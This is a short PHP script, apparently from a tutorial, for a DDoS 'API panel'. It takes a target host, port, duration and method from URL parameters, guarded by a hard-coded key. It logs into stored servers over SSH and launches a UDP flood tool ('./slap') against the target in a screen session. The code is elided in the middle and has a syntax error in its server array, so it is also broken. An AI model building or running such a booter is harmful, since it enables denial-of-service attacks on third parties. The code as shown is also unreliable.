//For ProdMods API Panel Tut: https://youtu.be/efDVra-as14
<?php
if (!function_exists('ssh2_connect'))
{
        die("Install ssh2 module.\n");
}
if ($_GET['key'] != "apikeyhere!"){
die("Go Fuck Yourself.");
}
if (isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'])) {
        $SERVERS = array(
                "server_ip"       =>      array("server_username", "server_password");
                );
        class ssh2 {
                var $connection;
        ...
        if($_GET['method'] == "UDP") { $command = "screen -dmS {$smIP} ./slap {$ip} {$port} 1024 {$time}"; }
